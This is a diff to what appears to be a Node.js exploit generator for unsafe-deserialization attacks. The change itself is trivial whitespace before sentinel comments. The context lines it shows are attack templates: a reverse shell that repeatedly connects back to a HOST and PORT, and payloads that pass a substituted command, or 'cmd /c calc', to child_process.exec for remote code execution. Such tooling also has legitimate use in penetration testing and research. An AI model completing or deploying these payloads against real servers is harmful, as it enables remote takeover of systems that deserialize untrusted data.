@@ -2253,7 +2253,7 @@ if (argv.vector == "rshell" && argv.serializer != "cryo") {
                         setTimeout(c(HOST, PORT), TIMEOUT);
                     });
                 }
-                c(HOST, PORT); //####SENTINEL####
+                c(HOST, PORT);//####SENTINEL####
             }
         }
     }
@@ -2267,7 +2267,7 @@ if (argv.vector == "rshell" && argv.serializer != "cryo") {
             CMD = "####COMMAND####";
             require('child_process').exec(CMD, function(error, stdout, stderr) {
                 console.log(stdout)
-            }); //####SENTINEL####
+            });//####SENTINEL####
         },
     }
 } else if (argv.vector == "rce" && argv.serializer == "cryo") {
@@ -2281,7 +2281,7 @@ if (argv.vector == "rshell" && argv.serializer != "cryo") {
                 CMD = "####COMMAND####";
                 require('child_process').exec(CMD, function(error, stdout, stderr) {
                     console.log(stdout)
-                }); //####SENTINEL####
+                });//####SENTINEL####
             }
         }
     }
@@ -2290,7 +2290,7 @@ if (argv.vector == "rshell" && argv.serializer != "cryo") {
         rce: function() {
             require('child_process').exec('cmd /c calc', function(error, stdout, stderr) {
                 console.log(stdout)
-            }); //####SENTINEL####
+            });//####SENTINEL####
         },
     }
 }
